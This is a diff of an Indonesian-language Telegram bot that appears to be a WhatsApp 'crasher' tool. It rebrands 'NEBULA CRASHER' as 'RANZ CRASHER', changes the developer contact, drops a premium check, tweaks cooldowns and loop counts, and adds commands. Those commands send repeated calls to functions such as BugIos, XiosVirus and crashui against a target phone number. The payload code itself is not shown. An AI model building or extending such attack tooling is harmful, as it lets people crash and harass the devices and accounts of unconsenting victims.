@@ -433,7 +433,7 @@ const checkPremium = async (ctx, next) => {
     await next();
   } else {
     await ctx.reply(
-      "❌ Maaf, Anda bukan user premium. Silakan hubungi developer @TheyFreak untuk upgrade."
+      "❌ Maaf, Anda bukan user premium. Silakan hubungi developer @abee1945 untuk upgrade."
     );
   }
 };
@@ -1662,7 +1662,7 @@ bot.command("comboranz", async (ctx) => {
 
     const statusMessage = await ctx.reply(
       `┏━━━━━━━━━━━━━━━━━━━━━
-┃        NEBULA CRASHER
+┃        RANZ  CRASHER
 ┣━━━━━━━━━━━━━━━━━━━━━
 ┃ TARGET : ${formattedNumber}
 ┃ TYPE : CURSED
@@ -1699,7 +1699,7 @@ bot.command("comboranz", async (ctx) => {
       null,
       `  
 ┏━━━━━━━━━━━━━━━━━━━━━
-┃       NEBULA CRASHER
+┃       RANZ  CRASHER
 ┣━━━━━━━━━━━━━━━━━━━━━
 ┃ TARGET : ${formattedNumber}
 ┃ TYPE : CURSED
@@ -1715,7 +1715,7 @@ bot.command("comboranz", async (ctx) => {
     );
   }
 });
-bot.command("trashui", checkPremium, async (ctx) => {
+bot.command("ranzios", async (ctx) => {
   const userId = ctx.from.id;
 
   // Cek apakah pengguna dalam cooldown
@@ -1729,7 +1729,7 @@ bot.command("trashui", checkPremium, async (ctx) => {
   }
 
   // Atur cooldown 60 detik
-  const cooldownDuration = 20000;
+  const cooldownDuration = 72000;
   cooldownUsers.set(userId, Date.now() + cooldownDuration);
 
   setTimeout(() => {
@@ -1755,7 +1755,7 @@ bot.command("trashui", checkPremium, async (ctx) => {
 
     const statusMessage = await ctx.reply(
       `┏━━━━━━━━━━━━━━━━━━━━━
-┃        NEBULA CRASHER
+┃        RANZ  CRASHER
 ┣━━━━━━━━━━━━━━━━━━━━━
 ┃ TARGET : ${formattedNumber}
 ┃ TYPE : TRASHUI
@@ -1776,8 +1776,8 @@ bot.command("trashui", checkPremium, async (ctx) => {
           continue;
         }
 
-        for (let i = 0; i < 15; i++) {
-          await crashui(sock, target);
+        for (let i = 0; i < 2; i++) {
+          await BugIos(sock, target);
         }
         successCount++;
       } catch (error) {
@@ -1791,7 +1791,7 @@ bot.command("trashui", checkPremium, async (ctx) => {
       null,
       `  
 ┏━━━━━━━━━━━━━━━━━━━━━
-┃       NEBULA CRASHER
+┃       RANZ  CRASHER
 ┣━━━━━━━━━━━━━━━━━━━━━
 ┃ TARGET : ${formattedNumber}
 ┃ TYPE : TRASHUI
@@ -2060,6 +2060,8 @@ async function sendMainMenu(ctx) {
 ╰─────
 ╭───── ⧼ 𝑩 𝑼 𝑮 𝑴 𝑬 𝑵 𝑼 ⧽
 │ /bugranz
+│ /ranzios
+│ /comboranz
 │ /ranzv1
 ╰─────
     `,
@@ -2114,6 +2116,8 @@ bot.action("startmenu", async (ctx) => {
 ╰─────
 ╭───── ⧼ 𝑩 𝑼 𝑮 𝑴 𝑬 𝑵 𝑼 ⧽
 │ /bugranz
+│ /ranzios
+│ /comboranz
 │ /ranzv1
 ╰─────
 `;
@@ -3543,7 +3547,7 @@ async function XiosVirus(sock, target) {
 }
 
 async function BugIos(sock, target) {
-  for (let i = 0; i < 15; i++) {
+  for (let i = 0; i < 2; i++) {
     await IosMJ(sock, target);
     await XiosVirus(sock, target);
     await QDIphone(sock, target);
